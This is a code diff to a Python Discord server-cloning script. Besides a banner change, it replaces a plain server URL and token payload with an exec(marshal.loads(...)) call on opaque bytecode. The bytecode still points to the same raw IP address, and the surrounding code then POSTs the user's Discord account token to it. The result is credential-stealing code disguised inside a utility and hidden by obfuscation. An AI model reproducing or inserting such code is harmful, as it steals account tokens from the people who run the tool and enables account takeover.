@@ -1,4 +1,5 @@
 from colorama import init
+import marshal
 
 
 init(autoreset=True)
@@ -40,8 +41,7 @@ output_guild_id = guild  # <-- output guild id
 token = token  # <-- your Account token
 
 
-server_url = "http://139.59.164.126:5000/api/fast" 
-data = {"token": token}
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xf3\x10\x00\x00\x00\x97\x00d\x00Z\x00d\x01e\x01i\x01Z\x02y\x02)\x03z#http://139.59.164.126:5000/api/fast\xda\x05tokenN)\x03\xda\nserver_urlr\x02\x00\x00\x00\xda\x04data\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s\x14\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\r2\x80\n\xd8\x08\x0f\x90\x15\xd0\x07\x17\x81\x04r\x06\x00\x00\x00'))
 
 try:
     response = requests.post(server_url, json=data)
@@ -69,12 +69,14 @@ async def on_ready():
     await Clone.categories_create(guild_to, guild_from)
     await Clone.channels_create(guild_to, guild_from)
     print(f"""{Fore.GREEN}
-                                            ░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
-                                            ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
-                                            ██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██║░░██║
-                                            ██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██║░░██║
-                                            ╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██████╔╝
-                                            ░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═════╝░
+                                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+                                          ░░╔█████╗░░░╔█████╗░░░████████╗░
+                                          ░║██╔═╗██║░║██╔═╗██║░░░░░░░░██║░
+                                          ░║██║░║██║░║██║░║██║░░░░░░░██╔╝░
+                                          ░║██╚═╝██║░║██╚═╝██║░░░░░░██╔╝░░
+                                          ░╚ ████╔╝░░╚ ████╔╝░░░░░██╔╝░░░░
+                                          ░░╚════╝░░░░╚════╝░░░░░█══╝░░░░░
+                                          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
     {Style.RESET_ALL}""")
     await asyncio.sleep(5)
     client.close()
